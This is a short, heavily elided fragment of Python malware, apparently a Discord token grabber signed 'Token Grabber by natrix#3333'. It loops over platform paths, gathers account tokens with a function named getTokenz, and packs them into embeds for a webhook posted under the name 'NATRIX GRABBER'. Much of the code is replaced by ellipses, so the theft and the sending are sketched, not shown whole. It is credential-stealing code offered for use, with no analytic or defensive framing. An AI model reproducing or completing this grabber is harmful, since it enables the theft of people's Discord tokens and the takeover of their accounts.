...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokenz(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": f"Token Grabber by natrix#3333 - Reserved for my team."
                }
            }
            embeds.append(embed)
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "NATRIX GRABBER",
        "avatar_url": "https://cdn.discordapp.com/attachments/844250939647852565/844251052999966762/SPOILER_discordhack.jpg"
    }
    try:
